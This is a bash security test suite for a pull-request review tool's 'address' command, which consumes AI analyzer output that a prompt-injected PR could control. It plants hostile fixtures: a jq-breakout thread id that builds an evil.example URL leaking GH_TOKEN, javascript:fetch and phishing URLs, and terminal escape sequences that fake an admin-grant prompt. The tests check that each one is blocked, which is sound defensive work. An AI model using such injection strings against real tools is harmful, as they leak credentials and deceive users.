#!/bin/bash
# Security tests for the `address` subcommand.
#
# Selected and legacy analysis files are analyzer output, and analyzers read PR content. A
# PR author who prompt-injects the analyzer controls the strings in that file, so
# every value taken from it must be treated as hostile — particularly the thread
# ids, which reach a jq program and then a browser.

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
GH_PR_ENRICH="$PROJECT_DIR/gh-pr-enrich"
TEST_OUTPUT_DIR="$SCRIPT_DIR/test-output/address-security"
STUB_DIR="$TEST_OUTPUT_DIR/stubs"
OPENED_LOG="$TEST_OUTPUT_DIR/opened-urls.txt"

# shellcheck source=lib/assert.sh
source "$SCRIPT_DIR/lib/assert.sh"

cleanup() { rm -rf "$TEST_OUTPUT_DIR"; }
trap cleanup EXIT
cleanup
mkdir -p "$STUB_DIR"

suite_start "gh pr-enrich address security suite"

# Stub the browser openers so a test can never launch one, and record what would
# have been opened.
for opener in open xdg-open; do
    cat > "$STUB_DIR/$opener" << 'STUB'
#!/bin/bash
printf '%s\n' "$1" >> "$OPENED_URLS_LOG"
STUB
    chmod +x "$STUB_DIR/$opener"
done

cat > "$STUB_DIR/gh" << 'STUB'
#!/bin/bash
case "$1 $2" in
    "pr view")
        if [ -n "${GH_WORKSPACE_MUTATION:-}" ]; then
            printf 'changed during hosted verification\n' >> "$GH_WORKSPACE_MUTATION"
            echo '{"headRefOid":"captured-head"}'
        elif [ "${GH_HEAD_MODE:-}" = "captured" ]; then
            echo '{"headRefOid":"captured-head"}'
        elif [ "${GH_HEAD_MODE:-}" = "advance_after_mutation" ] && \
           [ ! -s "$GH_MUTATIONS_LOG" ]; then
            echo '{"headRefOid":"captured-head"}'
        else
            echo '{"headRefOid":"new-hosted-head"}'
        fi
        exit 0
        ;;
    "api graphql")
        case "$*" in
            *"unresolveReviewThread"*)
                for arg in "$@"; do
                    case "$arg" in
                        threadId=*)
                            printf 'unresolve:%s\n' "${arg#threadId=}" >> "$GH_MUTATIONS_LOG"
                            ;;
                    esac
                done
                echo '{"data":{"unresolveReviewThread":{"thread":{"isResolved":false}}}}'
                exit 0
                ;;
            *"resolveReviewThread"*)
                for arg in "$@"; do
                    case "$arg" in
                        threadId=*) printf '%s\n' "$arg" >> "$GH_MUTATIONS_LOG" ;;
                    esac
                done
                if [ "${GH_RESOLVE_MODE:-}" = "applied_nonzero" ]; then
                    echo 'transport failed after apply' >&2
                    exit 1
                fi
                if [ "${GH_RESOLVE_MODE:-}" = "applied_malformed" ]; then
                    echo 'not-json-after-apply'
                    exit 0
                fi
                echo '{"data":{"resolveReviewThread":{"thread":{"isResolved":true}}}}'
                exit 0
                ;;
            *"PullRequestReviewThread"*)
                thread_id=""
                for arg in "$@"; do
                    case "$arg" in threadId=*) thread_id="${arg#threadId=}" ;; esac
                done
                resolved=false
                comments='[]'
                has_next_page=false
                [ "${GH_LIVE_INCOMPLETE:-}" != true ] || has_next_page=true
                if [ -n "${GH_MUTATIONS_LOG:-}" ] && \
                   grep -q "^threadId=$thread_id$" "$GH_MUTATIONS_LOG" 2>/dev/null && \
                   ! grep -q "^unresolve:$thread_id$" "$GH_MUTATIONS_LOG" 2>/dev/null; then
                    resolved=true
                    if [ "${GH_REPLY_AFTER_MUTATION:-}" = true ]; then
                        comments='[{"id":"PRRC_reply","databaseId":2,"author":{"login":"reviewer"},"createdAt":"2026-01-02T00:00:00Z","lastEditedAt":null,"url":"https://github.com/o/r/pull/999#discussion_r2"}]'
                    fi
                fi
                jq -n --arg thread_id "$thread_id" --argjson resolved "$resolved" \
                    --argjson has_next_page "$has_next_page" \
                    --argjson comments "$comments" '{data:{node:{
                        __typename:"PullRequestReviewThread",id:$thread_id,
                        isResolved:$resolved,comments:{pageInfo:{
                            hasNextPage:$has_next_page,endCursor:null},nodes:$comments}}}}'
                exit 0
                ;;
        esac
        for arg in "$@"; do
            case "$arg" in
                threadId=*) printf '%s\n' "$arg" >> "$GH_MUTATIONS_LOG" ;;
            esac
        done
        echo '{"data":{"resolveReviewThread":{"thread":{"isResolved":true}}}}'
        exit 0
        ;;
esac
exit 1
STUB
chmod +x "$STUB_DIR/gh"

# Give address a current provider-neutral selection. Strict mutation consumers
# no longer accept metadata-less legacy reports, even for task display.
write_current_selection() {
    local ws="$1"
    local source_file="$2"
    local thread_id="${3:-}"
    local report_dir="$ws/.reports/pr-reviews/pr-999"
    local context_file="$report_dir/analysis-context.json"
    local context_fingerprint workspace_fingerprint inspected_sha thread_ids existing_root

    existing_root=$(git -C "$ws" rev-parse --show-toplevel 2>/dev/null || echo "")
    if [ "$existing_root" != "$ws" ]; then
        (cd "$ws" && git init -q . && git config user.email t@t && \
            git config user.name t && \
            git -c commit.gpgsign=false commit -qm fixture --allow-empty)
    fi
    inspected_sha=$(git -C "$ws" rev-parse HEAD)

    # Address is a strict mutation consumer: every displayed task must map to
    # a confirmed finding, and confirmed findings require a current code-access
    # fingerprint. Normalize terse test inputs into that production contract.
    jq '
        . as $analysis
        | (($analysis.task_list // []) | to_entries) as $tasks
        | .task_list = [$tasks[] | .key as $index | .value + {
            finding_ids: ["address-task-" + ($index | tostring)]
          }]
        | .issue_categories = [$tasks[] | .key as $index | .value as $task | {
            finding_id: ("address-task-" + ($index | tostring)),
            name: "Address fixture finding", category: "logic_error",
            severity: "high", impact: "moderate", likelihood: "likely",
            severity_rationale: "fixture", verdict: "confirmed", confidence: "high",
            description: "fixture",
            evidence: [{file:($task.file // "n/a"),line:($task.line // 0),detail:"fixture"}],
            thread_ids: ($task.thread_ids // [])
          }]
    ' "$source_file" > "$report_dir/analysis.json"
    rm -f "$source_file"
    thread_ids=$(jq -c --arg tid "$thread_id" '
        [(.task_list // [])[].thread_ids[]?, $tid]
        | map(select(type == "string" and test("^PRRT_[A-Za-z0-9_-]+$")))
        | unique
    ' "$report_dir/analysis.json")

    jq -n --argjson tids "$thread_ids" --arg inspected_sha "$inspected_sha" '{
        pr: {repository:"o/r", number:999},
        unresolved_threads: [$tids[] | {thread_id:.,comments_complete:true,comment_identity:[]}],
        coverage: {code_access:{state:"enabled", pr_head_sha:"captured-head",
            inspected_sha:$inspected_sha, revision_matches:false}}
    }' > "$context_file"
    workspace_fingerprint=$(cd "$ws" && "$GH_PR_ENRICH" --test-call \
        code_access_workspace_fingerprint "$report_dir")
    jq --arg workspace_fingerprint "$workspace_fingerprint" \
        '.coverage.code_access.workspace_fingerprint = $workspace_fingerprint' \
        "$context_file" > "$context_file.tmp"
    mv "$context_file.tmp" "$context_file"
    context_fingerprint=$("$GH_PR_ENRICH" --test-call \
        analysis_context_fingerprint "$context_file")
    jq --arg fingerprint "$context_fingerprint" \
        '.coverage.context_fingerprint = $fingerprint' "$context_file" \
        > "$context_file.tmp"
    mv "$context_file.tmp" "$context_file"
    jq --arg fingerprint "$context_fingerprint" \
        --arg workspace_fingerprint "$workspace_fingerprint" '. + {_metadata:{
        provider:"claude", repository:"o/r", pr_number:999,
        pr_head_sha:"captured-head", context_fingerprint:$fingerprint,
        workspace_fingerprint:$workspace_fingerprint
    }}' "$report_dir/analysis.json" > "$report_dir/analysis.json.tmp"
    mv "$report_dir/analysis.json.tmp" "$report_dir/analysis.json"
}

# Build a workspace with a hostile analysis file and run `address` in it.
# $1 = thread id planted in analysis.json
# $2 = url planted in comment-threads.json for the benign id
run_address() {
    local thread_id="$1"
    local planted_url="${2:-https://github.com/o/r/pull/999#discussion_r1}"
    local ws="$TEST_OUTPUT_DIR/ws"

    rm -rf "$ws"
    mkdir -p "$ws/.reports/pr-reviews/pr-999"
    : > "$OPENED_LOG"

    jq -n --arg tid "$thread_id" '{
        issue_categories: [], category_coverage: [], disputed_comments: [],
        systemic_issues: [], adjacent_problems: [],
        task_list: [{
            priority: "high", task: "Task under test", thread_ids: [$tid],
            file: "a.js", line: 1, suggested_fix: "fix", verification: "npm test"
        }],
        process_improvements: [], pr_template_suggestions: []
    }' > "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"

    write_current_selection "$ws" \
        "$ws/.reports/pr-reviews/pr-999/claude-analysis.json" "$thread_id"

    jq -n --arg url "$planted_url" '{
        data: {repository: {pullRequest: {reviewThreads: {nodes: [
            {id: "PRRT_benign", isResolved: false,
             comments: {nodes: [{url: $url}]}}
        ]}}}}
    }' > "$ws/.reports/pr-reviews/pr-999/comment-threads.json"

    # "o" opens the thread, "q" quits the loop.
    printf 'oq' | (cd "$ws" && env OPENED_URLS_LOG="$OPENED_LOG" PATH="$STUB_DIR:$PATH" \
        "$GH_PR_ENRICH" address 999 2>&1) || true
}

# ---------------------------------------------------------------------------
# jq program-string breakout
#
# The id closes the interpolated string literal and supplies its own program,
# synthesizing a URL of the attacker's choosing (and jq can read $ENV, so the
# same hole leaks environment variables).
# ---------------------------------------------------------------------------
EXFIL='x") | ("https://evil.example/?leak=" + ($ENV.GH_TOKEN // "none")) // ("'
OUT=$(run_address "$EXFIL")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")

assert_not_contains "$OPENED" "evil.example" "a jq-breakout thread id cannot open an attacker URL"
assert_not_contains "$OPENED" "GH_TOKEN" "environment variables cannot be exfiltrated through the URL"
assert_contains "$OUT" "Analysis not found" "the malformed thread id is rejected before task display"

# A plain quote is enough to corrupt the program even without a payload.
OUT=$(run_address 'PRRT_abc" or "1"=="1')
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a quoted thread id opens nothing"

# ---------------------------------------------------------------------------
# The feature still works for a legitimate id
# ---------------------------------------------------------------------------
OUT=$(run_address "PRRT_benign")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_contains "$OPENED" "https://github.com/o/r/pull/999#discussion_r1" \
    "a valid thread id still opens its comment URL"

# ---------------------------------------------------------------------------
# The URL itself is checked before it reaches the opener
# ---------------------------------------------------------------------------
OUT=$(run_address "PRRT_benign" "javascript:fetch('https://evil.example')")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a non-https URL is never handed to the browser"

OUT=$(run_address "PRRT_benign" "https://evil.example/phish")
OPENED=$(cat "$OPENED_LOG" 2>/dev/null || echo "")
assert_eq "" "$OPENED" "a URL outside GitHub is never handed to the browser"

# ---------------------------------------------------------------------------
# Terminal escape sequences in analyzer output
#
# Task text is printed straight to the user's terminal. Escape sequences there
# can repaint the screen, hide text, or fake the tool's own prompts — so an
# injected analysis could misrepresent what the user is approving.
# ---------------------------------------------------------------------------
run_address_with_task() {
    local task_json="$1"
    local ws="$TEST_OUTPUT_DIR/ws-term"

    rm -rf "$ws"
    mkdir -p "$ws/.reports/pr-reviews/pr-999"
    jq -n --argjson task "$task_json" '{
        issue_categories: [], category_coverage: [], disputed_comments: [],
        systemic_issues: [], adjacent_problems: [], task_list: [$task],
        process_improvements: [], pr_template_suggestions: []
    }' > "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"
    write_current_selection "$ws" \
        "$ws/.reports/pr-reviews/pr-999/claude-analysis.json"
    echo '{"data":{"repository":{"pullRequest":{"reviewThreads":{"nodes":[]}}}}}' \
        > "$ws/.reports/pr-reviews/pr-999/comment-threads.json"

    printf 'q' | (cd "$ws" && env PATH="$STUB_DIR:$PATH" "$GH_PR_ENRICH" address 999 2>&1) || true
}

#  is a real escape byte once jq -r decodes it.
HOSTILE_TASK=$(jq -n '{
    priority: "high[2J[H",
    task: "Harmless looking[31m FAKE PROMPT: [y]es to grant admin",
    thread_ids: [],
    file: "a.js", line: 1,
    suggested_fix: "fix[1;32m",
    verification: "npm test[0m"
}')

TERM_OUT=$(run_address_with_task "$HOSTILE_TASK")

# The payload's printable remainder ("[2J") is harmless; what matters is that no
# ESC byte survives to be interpreted by the terminal.
if printf '%s' "$TERM_OUT" | grep -q $'\033\\[2J'; then
    fail "screen-clearing escape from analyzer output is neutralized" "a raw ESC[2J reached the terminal"
else
    pass "screen-clearing escape from analyzer output is neutralized"
fi

if printf '%s' "$TERM_OUT" | grep -q $'\033\\[31m FAKE PROMPT'; then
    fail "color escapes in task text are neutralized" "a raw ESC[31m reached the terminal"
else
    pass "color escapes in task text are neutralized"
fi

assert_contains "$TERM_OUT" "FAKE PROMPT" "the task text itself is still shown to the user"

# A current, provenance-valid selected artifact must still satisfy the task to
# confirmed-finding relationship at consumption time. Local replacement of a
# generated analysis file cannot revive an unlinked or unverified task.
STRICT_LINK_WS="$TEST_OUTPUT_DIR/ws-strict-link"
STRICT_LINK_REPORT="$STRICT_LINK_WS/.reports/pr-reviews/pr-999"
STRICT_LINK_SOURCE="$STRICT_LINK_REPORT/claude-analysis.json"
mkdir -p "$STRICT_LINK_REPORT"
jq -n '{
    issue_categories: [], category_coverage: [], disputed_comments: [],
    systemic_issues: [], adjacent_problems: [],
    task_list: [{priority:"high",task:"STRICT LINK TASK",thread_ids:[],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    process_improvements: [], pr_template_suggestions: []
}' > "$STRICT_LINK_SOURCE"
write_current_selection "$STRICT_LINK_WS" "$STRICT_LINK_SOURCE"
cp "$STRICT_LINK_REPORT/analysis.json" "$TEST_OUTPUT_DIR/strict-link-valid.json"
jq 'del(.task_list[0].finding_ids)' "$TEST_OUTPUT_DIR/strict-link-valid.json" \
    > "$STRICT_LINK_REPORT/analysis.json"
STRICT_UNLINKED_OUT=$( (cd "$STRICT_LINK_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$STRICT_UNLINKED_OUT" "Analysis not found" \
    "address rejects a provenance-valid task without finding linkage"
assert_not_contains "$STRICT_UNLINKED_OUT" "STRICT LINK TASK" \
    "address never displays an unlinked current task"
jq '.issue_categories[0].verdict = "plausible"' \
    "$TEST_OUTPUT_DIR/strict-link-valid.json" > "$STRICT_LINK_REPORT/analysis.json"
STRICT_PLAUSIBLE_OUT=$( (cd "$STRICT_LINK_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$STRICT_PLAUSIBLE_OUT" "Analysis not found" \
    "address rejects a task mapped only to a plausible finding"
assert_not_contains "$STRICT_PLAUSIBLE_OUT" "STRICT LINK TASK" \
    "address never displays a plausible-only current task"

# A current provider source can remain on disk after selection rejects it. The
# address workflow must not consume it through the pre-v2.1 legacy fallback.
CURRENT_SOURCE_WS="$TEST_OUTPUT_DIR/ws-current-source"
mkdir -p "$CURRENT_SOURCE_WS/.reports/pr-reviews/pr-999"
jq -n '{
    issue_categories: [], category_coverage: [], disputed_comments: [],
    systemic_issues: [], adjacent_problems: [],
    task_list: [{priority:"high",task:"REJECTED CURRENT TASK",thread_ids:[],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    process_improvements: [], pr_template_suggestions: [],
    _metadata: {provider:"claude",pr_head_sha:"head",context_fingerprint:"sha256:fixture"}
}' > "$CURRENT_SOURCE_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
CURRENT_SOURCE_OUT=$( (cd "$CURRENT_SOURCE_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$CURRENT_SOURCE_OUT" "Analysis not found" \
    "address refuses a current Claude source that was not selected"
assert_not_contains "$CURRENT_SOURCE_OUT" "REJECTED CURRENT TASK" \
    "address never presents tasks from a rejected current provider source"

# analysis.json did not exist before the v2.1 selection workflow. A branch must
# not be able to plant a metadata-less file under the selected name and have an
# address run consume it without context, provenance, or selection validation.
PLANTED_SELECTED_WS="$TEST_OUTPUT_DIR/ws-planted-selected"
mkdir -p "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999"
jq -n '{
    issue_categories: [], category_coverage: [], disputed_comments: [],
    systemic_issues: [], adjacent_problems: [],
    task_list: [{priority:"high",task:"BRANCH PLANTED TASK",thread_ids:[],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    process_improvements: [], pr_template_suggestions: []
}' > "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json"
(cd "$PLANTED_SELECTED_WS" && git init -q . && git config user.email t@t && \
    git config user.name t && git add -A && git commit -qm init)
PLANTED_SELECTED_OUT=$( (cd "$PLANTED_SELECTED_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$PLANTED_SELECTED_OUT" "Analysis not found" \
    "address rejects a branch-tracked metadata-less selected result"
assert_not_contains "$PLANTED_SELECTED_OUT" "BRANCH PLANTED TASK" \
    "address never presents tasks from a planted selected result"

TRACKED_LEGACY_WS="$TEST_OUTPUT_DIR/ws-tracked-legacy"
mkdir -p "$TRACKED_LEGACY_WS/.reports/pr-reviews/pr-999"
cp "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json" \
    "$TRACKED_LEGACY_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
(cd "$TRACKED_LEGACY_WS" && git init -q . && git config user.email t@t && \
    git config user.name t && git add -A && git commit -qm init)
TRACKED_LEGACY_OUT=$( (cd "$TRACKED_LEGACY_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$TRACKED_LEGACY_OUT" "Analysis not found" \
    "address rejects a branch-tracked legacy analysis"

SYMLINK_LEGACY_WS="$TEST_OUTPUT_DIR/ws-symlink-legacy"
mkdir -p "$SYMLINK_LEGACY_WS/.reports/pr-reviews/pr-999"
cp "$PLANTED_SELECTED_WS/.reports/pr-reviews/pr-999/analysis.json" \
    "$SYMLINK_LEGACY_WS/legacy-target.json"
ln -s ../../../legacy-target.json \
    "$SYMLINK_LEGACY_WS/.reports/pr-reviews/pr-999/claude-analysis.json"
SYMLINK_LEGACY_OUT=$( (cd "$SYMLINK_LEGACY_WS" && \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$SYMLINK_LEGACY_OUT" "Analysis not found" \
    "address rejects a symlinked legacy analysis"

# Revalidate immediately before hosted mutation. A selection valid at head A
# cannot resolve threads after the PR advances to head B.
STALE_MUTATION_WS="$TEST_OUTPUT_DIR/ws-stale-mutation"
STALE_MUTATION_REPORT="$STALE_MUTATION_WS/.reports/pr-reviews/pr-999"
MUTATION_LOG="$TEST_OUTPUT_DIR/stale-mutations.log"
mkdir -p "$STALE_MUTATION_REPORT"
jq -n '{
    issue_categories:[], category_coverage:[], disputed_comments:[],
    systemic_issues:[], adjacent_problems:[],
    task_list:[{priority:"high",task:"STALE TASK",
        thread_ids:["PRRT_stale","PRRT_first","PRRT_second"],
        file:"a.js",line:1,suggested_fix:"fix",verification:"test"}],
    process_improvements:[], pr_template_suggestions:[]
}' > "$STALE_MUTATION_REPORT/claude-analysis.json"
write_current_selection "$STALE_MUTATION_WS" \
    "$STALE_MUTATION_REPORT/claude-analysis.json"
jq '.task_list[0].thread_ids = ["PRRT_stale"]' \
    "$STALE_MUTATION_REPORT/analysis.json" \
    > "$STALE_MUTATION_REPORT/analysis.json.tmp"
mv "$STALE_MUTATION_REPORT/analysis.json.tmp" \
    "$STALE_MUTATION_REPORT/analysis.json"
STALE_BATCH_TEMPLATE="$TEST_OUTPUT_DIR/stale-batch-analysis.json"
cp "$STALE_MUTATION_REPORT/analysis.json" "$STALE_BATCH_TEMPLATE"
: > "$MUTATION_LOG"
INCOMPLETE_THREAD_OUT=$(printf 'f' | (cd "$STALE_MUTATION_WS" && \
    env GH_HEAD_MODE=captured GH_LIVE_INCOMPLETE=true \
    GH_MUTATIONS_LOG="$MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$INCOMPLETE_THREAD_OUT" "could not be fetched completely" \
    "address rejects a live discussion whose complete comments were not fetched"
assert_eq "" "$(cat "$MUTATION_LOG")" \
    "an incomplete live discussion sends no resolution mutation"
cp "$STALE_BATCH_TEMPLATE" "$STALE_MUTATION_REPORT/analysis.json"
: > "$MUTATION_LOG"
STALE_MUTATION_OUT=$(printf 'f' | (cd "$STALE_MUTATION_WS" && \
    env GH_MUTATIONS_LOG="$MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$STALE_MUTATION_OUT" "Hosted PR head changed" \
    "address refuses hosted mutation after the PR head advances"
assert_eq "" "$(cat "$MUTATION_LOG")" \
    "a stale selected analysis sends no thread-resolution mutation"
assert_true "$([ ! -e "$STALE_MUTATION_REPORT/analysis.json" ] && echo 0 || echo 1)" \
    "a stale address run invalidates the selected artifact"

jq '.task_list[0].task = "BATCH TASK"
    | .task_list[0].thread_ids = ["PRRT_first","PRRT_second"]' \
    "$STALE_BATCH_TEMPLATE" > "$STALE_MUTATION_REPORT/analysis.json"
: > "$MUTATION_LOG"
BATCH_MUTATION_OUT=$(printf 'f' | (cd "$STALE_MUTATION_WS" && \
    env GH_HEAD_MODE=advance_after_mutation GH_MUTATIONS_LOG="$MUTATION_LOG" \
    PATH="$STUB_DIR:$PATH" "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$BATCH_MUTATION_OUT" "reopened PRRT_first" \
    "a head change during mutation compensates by reopening the thread"
assert_not_contains "$BATCH_MUTATION_OUT" "Resolved: PRRT_first" \
    "a compensated head-race resolution is not reported as successful"
assert_eq "2" "$(wc -l < "$MUTATION_LOG" | tr -d ' ')" \
    "a head race sends one resolve and one compensating unresolve mutation"
assert_not_contains "$(cat "$MUTATION_LOG")" "PRRT_second" \
    "a head race blocks all later thread mutations"

# The hosted-head read is itself a trust boundary. If the local tree changes
# during that read, the final workspace check must reject the selected result
# before resolveReviewThread is sent.
LOCAL_MUTATION_WS="$TEST_OUTPUT_DIR/ws-local-mutation"
LOCAL_MUTATION_REPORT="$LOCAL_MUTATION_WS/.reports/pr-reviews/pr-999"
LOCAL_MUTATION_CONTEXT_TMP="$TEST_OUTPUT_DIR/local-mutation-context.tmp.json"
LOCAL_MUTATION_LOG="$TEST_OUTPUT_DIR/local-mutation.log"
mkdir -p "$LOCAL_MUTATION_WS"
(cd "$LOCAL_MUTATION_WS" && git init -q . && git config user.email t@t && \
    git config user.name t)
printf 'stable\n' > "$LOCAL_MUTATION_WS/base.txt"
(cd "$LOCAL_MUTATION_WS" && git add base.txt && git commit -qm init)
mkdir -p "$LOCAL_MUTATION_REPORT"
LOCAL_WORKSPACE_FINGERPRINT=$(cd "$LOCAL_MUTATION_WS" && \
    "$GH_PR_ENRICH" --test-call code_access_workspace_fingerprint \
        .reports/pr-reviews/pr-999)
jq -n --arg workspace_fingerprint "$LOCAL_WORKSPACE_FINGERPRINT" \
    '{pr:{repository:"o/r",number:999},
    unresolved_threads:[{thread_id:"PRRT_local",comments_complete:true,
        comment_identity:[]}],coverage:{code_access:{
        state:"enabled",pr_head_sha:"captured-head",
        workspace_fingerprint:$workspace_fingerprint}}}' \
    > "$LOCAL_MUTATION_CONTEXT_TMP"
LOCAL_CONTEXT_FINGERPRINT=$("$GH_PR_ENRICH" --test-call analysis_context_fingerprint \
    "$LOCAL_MUTATION_CONTEXT_TMP")
jq --arg fingerprint "$LOCAL_CONTEXT_FINGERPRINT" \
    '.coverage.context_fingerprint = $fingerprint' \
    "$LOCAL_MUTATION_CONTEXT_TMP" > "$LOCAL_MUTATION_REPORT/analysis-context.json"
jq -n --arg fingerprint "$LOCAL_CONTEXT_FINGERPRINT" \
    --arg workspace_fingerprint "$LOCAL_WORKSPACE_FINGERPRINT" '{
    issue_categories:[{finding_id:"local-mutation",name:"correctness",
        severity:"high",verdict:"confirmed",thread_ids:["PRRT_local"]}],
    task_list:[{priority:"high",task:"LOCAL MUTATION TASK",
        finding_ids:["local-mutation"],thread_ids:["PRRT_local"],file:"base.txt",line:1,
        suggested_fix:"fix",verification:"test"}],
    _metadata:{provider:"codex",repository:"o/r",pr_number:999,
        pr_head_sha:"captured-head",context_fingerprint:$fingerprint,
        workspace_fingerprint:$workspace_fingerprint}
}' > "$LOCAL_MUTATION_REPORT/analysis.json"
cat > "$LOCAL_MUTATION_REPORT/comprehensive-report.md" << 'EOF'
# Base PR report

Base report content must survive selected-analysis invalidation.

<!-- BEGIN SELECTED ANALYSIS -->

STALE SELECTED FINDING

<!-- END SELECTED ANALYSIS -->
EOF
LOCAL_CONTEXT_TEMPLATE="$TEST_OUTPUT_DIR/local-context-template.json"
LOCAL_ANALYSIS_TEMPLATE="$TEST_OUTPUT_DIR/local-analysis-template.json"
cp "$LOCAL_MUTATION_REPORT/analysis-context.json" "$LOCAL_CONTEXT_TEMPLATE"
cp "$LOCAL_MUTATION_REPORT/analysis.json" "$LOCAL_ANALYSIS_TEMPLATE"
: > "$LOCAL_MUTATION_LOG"

printf 'drift before address starts\n' >> "$LOCAL_MUTATION_WS/base.txt"
PRESTART_WORKSPACE_OUT=$(printf 'q' | (cd "$LOCAL_MUTATION_WS" && \
    env GH_HEAD_MODE=captured GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" \
    PATH="$STUB_DIR:$PATH" "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$PRESTART_WORKSPACE_OUT" "Analysis not found" \
    "address rejects an enabled confirmed selection after pre-start workspace drift"
assert_eq "" "$(cat "$LOCAL_MUTATION_LOG")" \
    "pre-start workspace drift sends no hosted mutation"
assert_true "$([ ! -e "$LOCAL_MUTATION_REPORT/analysis.json" ] && echo 0 || echo 1)" \
    "pre-start workspace drift invalidates the selected artifact"
git -C "$LOCAL_MUTATION_WS" checkout -- base.txt
cp "$LOCAL_CONTEXT_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis-context.json"
cp "$LOCAL_ANALYSIS_TEMPLATE" "$LOCAL_MUTATION_REPORT/analysis.json"

LOCAL_MUTATION_OUT=$(printf 'f' | (cd "$LOCAL_MUTATION_WS" && \
    env GH_WORKSPACE_MUTATION="$LOCAL_MUTATION_WS/base.txt" \
    GH_MUTATIONS_LOG="$LOCAL_MUTATION_LOG" PATH="$STUB_DIR:$PATH" \
    "$GH_PR_ENRICH" address 999 2>&1) || true)
assert_contains "$LOCAL_MUTATION_OUT" "Resolved: PRRT_local" \
    "address permits a workspace edit after tasks are displayed"
assert_contains "$(cat "$LOCAL_MUTATION_LOG")" "threadId=PRRT_local" \
    "a post-prompt workspace edit still sends the intended resolution"
assert_not_contains "$(cat "$LOCAL_MUTATION_LOG")" "unresolve:PRRT_local" \
    "a post-prompt workspace edit does not trigger compensation"
assert_true "$([ -e "$LOCAL_MUTATION_REPORT/analysis.json" ] && echo 0 || echo 1)" \
    "a post-prompt workspace edit preserves the selected artifact"
git -C "$LOCAL_MUTATION_WS" checkout -- base.txt

# Invalidation preflights every derived artifact before deleting the selected
# JSON. A planted report symlink or branch-tracked report must fail closed and
# preserve the current selection.
UNSAFE_INVALIDATION_DIR="$TEST_OUTPUT_DIR/unsafe-invalidation"
mkdir -p "$UNSAFE_INVALIDATION_DIR"
echo '{"selected":true}' > "$UNSAFE_INVALIDATION_DIR/analysis.json"
echo "operator target" > "$TEST_OUTPUT_DIR/invalidation-target.md"
ln -s "$TEST_OUTPUT_DIR/invalidation-target.md" \
    "$UNSAFE_INVALIDATION_DIR/comprehensive-report.md"
rc=0
"$GH_PR_ENRICH" --test-call invalidate_selected_analysis \
    "$UNSAFE_INVALIDATION_DIR" >/dev/null 2>&1 || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "selected-analysis invalidation rejects a comprehensive-report symlink"
assert_true "$([ -f "$UNSAFE_INVALIDATION_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "unsafe invalidation preserves the selected JSON"
assert_eq "operator target" "$(cat "$TEST_OUTPUT_DIR/invalidation-target.md")" \
    "unsafe invalidation leaves the symlink target untouched"

TRACKED_INVALIDATION_WS="$TEST_OUTPUT_DIR/tracked-invalidation"
TRACKED_INVALIDATION_DIR="$TRACKED_INVALIDATION_WS/reports"
mkdir -p "$TRACKED_INVALIDATION_DIR"
(cd "$TRACKED_INVALIDATION_WS" && git init -q . && git config user.email t@t && \
    git config user.name t)
cat > "$TRACKED_INVALIDATION_DIR/comprehensive-report.md" << 'EOF'
# Tracked base
<!-- BEGIN SELECTED ANALYSIS -->
TRACKED STALE FINDING
<!-- END SELECTED ANALYSIS -->
EOF
(cd "$TRACKED_INVALIDATION_WS" && git add reports/comprehensive-report.md && \
    git commit -qm init)
echo '{"selected":true}' > "$TRACKED_INVALIDATION_DIR/analysis.json"
rc=0
(cd "$TRACKED_INVALIDATION_WS" && "$GH_PR_ENRICH" --test-call \
    invalidate_selected_analysis reports >/dev/null 2>&1) || rc=$?
assert_true "$([ "$rc" -ne 0 ] && echo 0 || echo 1)" \
    "selected-analysis invalidation rejects a branch-tracked comprehensive report"
assert_true "$([ -f "$TRACKED_INVALIDATION_DIR/analysis.json" ] && echo 0 || echo 1)" \
    "tracked-report invalidation preserves the selected JSON"
assert_contains "$(cat "$TRACKED_INVALIDATION_DIR/comprehensive-report.md")" \
    "TRACKED STALE FINDING" \
    "tracked-report invalidation leaves branch content untouched"

# Successful report replacement preserves the modes of the captured sources,
# including a combined view that already has no selected-analysis keys.
MODE_INVALIDATION_DIR="$TEST_OUTPUT_DIR/mode-invalidation"
mkdir -p "$MODE_INVALIDATION_DIR"
cat > "$MODE_INVALIDATION_DIR/comprehensive-report.md" << 'EOF'
# Mode base
<!-- BEGIN SELECTED ANALYSIS -->
MODE STALE FINDING
<!-- END SELECTED ANALYSIS -->
EOF
echo '{"base":"already clean"}' > "$MODE_INVALIDATION_DIR/combined-data.json"
echo '{"selected":true}' > "$MODE_INVALIDATION_DIR/analysis.json"
chmod 640 "$MODE_INVALIDATION_DIR/comprehensive-report.md"
chmod 644 "$MODE_INVALIDATION_DIR/combined-data.json"
